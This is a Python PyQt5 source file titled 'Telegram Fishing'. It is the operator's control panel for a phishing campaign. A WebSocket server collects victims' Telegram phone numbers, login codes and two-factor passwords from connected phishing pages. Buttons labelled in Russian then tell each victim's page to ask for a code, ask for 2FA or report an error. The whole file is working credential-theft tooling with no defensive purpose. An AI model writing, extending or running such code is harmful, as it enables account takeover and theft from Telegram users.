import os
import sys
import sys
from PyQt5 import Qt
from PyQt5.QtWidgets import (QWidget,QGridLayout,QApplication,QTableWidget,QHeaderView,QAbstractItemView
                             ,QTableWidgetItem,QHBoxLayout,QPushButton,QMessageBox)
from PyQt5.QtCore import *
from PyQt5 import *
from PyQt5.QtGui import *

class TG_FISHING(QWidget):
    
    def __init__(self,*args):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.grid=QGridLayout()
        self.table=QTableWidget()
        self.setWindowTitle('Telegram Fishing')
        self.create_table()        
        self.action_button=['Успех','Код','2FA','Неверный код','Неверная 2FA','Неверный номер']
        self.action_button2=[self.send_success, self.send_code, self.send_two_fa, self.send_not_code,
                             self.send_not_two_fa, self.send_not_tel]
        self.clients = []
        self.clientses = []
        self.server = QtWebSockets.QWebSocketServer('My Socket', QtWebSockets.QWebSocketServer.NonSecureMode)
        self.del_cli=None
        self.del_tabl=[]

        if self.server.listen(QtNetwork.QHostAddress.AnyIPv4, 5000):
            print('Connected: '+self.server.serverName()+' : '+self.server.serverAddress().toString()+':'+str(self.server.serverPort()))
        else:
            print('error')
        self.server.newConnection.connect(self.onNewConnection)
        print(self.server.isListening())
        self.grid.addWidget(self.table)
        self.setLayout(self.grid)
        self.setGeometry(250,250,1250,550)
        self.show()

    def onNewConnection(self):
        self.clientConnection = self.server.nextPendingConnection()   
        self.clientConnection.textMessageReceived.connect(self.processTextMessage)
        self.clientConnection.disconnected.connect(self.socketDisconnected)
        self.clientses.append(self.clientConnection)

    def setter_items(self,text,r,c):
        it = QTableWidgetItem(str(text))
        it.setTextAlignment(QtCore.Qt.AlignVCenter | QtCore.Qt.AlignHCenter)
        self.table.setItem(r,c,it)

    def get_code(self,id):
        k=int(0)
        for row in range(self.table.rowCount()):
            if self.table.item(row,0)!=None:
                if self.table.item(row,0).text()==id:
                    k=row
        return k

    def sett_to_table(self,mess):
        id=self.get_code(str(mess[0]))
        for v in range(0,4):
            self.setter_items(mess[v],id,v)
        
    def processTextMessage(self,  message):
        if str(message).startswith('id-')==True:
            if message not in self.clients:
                self.clients.append({'id':str(message).replace('id-',''),'Object':self.clientConnection})                
                for v in range(0,6):
                    self.table.insertRow(self.table.rowCount())
                    but=QPushButton(self.action_button[v])
                    self.table.setCellWidget(self.table.rowCount()-1,4, but)
                    but.clicked.connect(self.action_button2[v])

                self.setter_items(str(message).replace('id-',''),self.table.rowCount()-6,0)
                for v in range(0,4):
                    self.table.setSpan(self.table.rowCount()-6,v,6,1)

        if str(message).startswith('!$!')==True:
            message=str(message).split('!$!')[1::]
            self.sett_to_table(message)

        if str(message).startswith('er ')==True:
            message=str(message).replace('er ','')#.split('!$!')
            self.del_client(message)
            
        
    def del_client(self,id_del):
        if len(self.clients)!=0:
            self.del_cli=self.find_id_object(id_del)
            self.del_tabl=list(range(self.get_code(id_del),self.get_code(id_del)+6))
            self.clients=[a for a in self.clients if a['Object']!=self.del_cli]
        
    def find_id_object(self,ides):
        sides=[a['Object'] for a in self.clients if a['id']==ides][0]
        return sides
    
    def send_to_client(self,ids,text):
        ids.sendTextMessage(text)       

    def get_id_table(self,id):
        self.table.clearSelection()
        self.table.selectRow(self.table.currentRow())
        get_id=self.table.item(self.table.currentRow()-id,0).text()
        return get_id
        
    def send_success(self):
        self.send_to_client(self.find_id_object(self.get_id_table(0)),'0')

    def send_code(self):
        self.send_to_client(self.find_id_object(self.get_id_table(1)),'1')

    def send_two_fa(self):
        self.send_to_client(self.find_id_object(self.get_id_table(2)),'2')

    def send_not_code(self):
        self.send_to_client(self.find_id_object(self.get_id_table(3)),'3')

    def send_not_two_fa(self):
        self.send_to_client(self.find_id_object(self.get_id_table(4)),'4')

    def send_not_tel(self):
        self.send_to_client(self.find_id_object(self.get_id_table(5)),'5')

    def socketDisconnected(self):        
        self.clientses=[a for a in self.clientses if a!=self.del_cli]
        self.del_tabl=list(reversed(self.del_tabl))
        for v in range(len(self.del_tabl)):
            self.table.removeRow(self.del_tabl[v])

    def create_table(self):
        self.table.setColumnCount(5)
        self.table.setHorizontalHeaderLabels(['ID','Номер','Код','2FA','Действия'])
        self.table.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.Stretch)
        self.table.verticalHeader().setVisible(False)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
   
    def closeEvent(self,event):
        close=QMessageBox.question(self,'Выход','Вы хотите закрыть сервер?',QMessageBox.Ok | QMessageBox.No)
        if close==QMessageBox.Ok:
            event.accept()
        else:
            event.ignore()
            
if __name__=='__main__':
    app=QApplication(sys.argv)
    exe=TG_FISHING()
    sys.exit(app.exec_())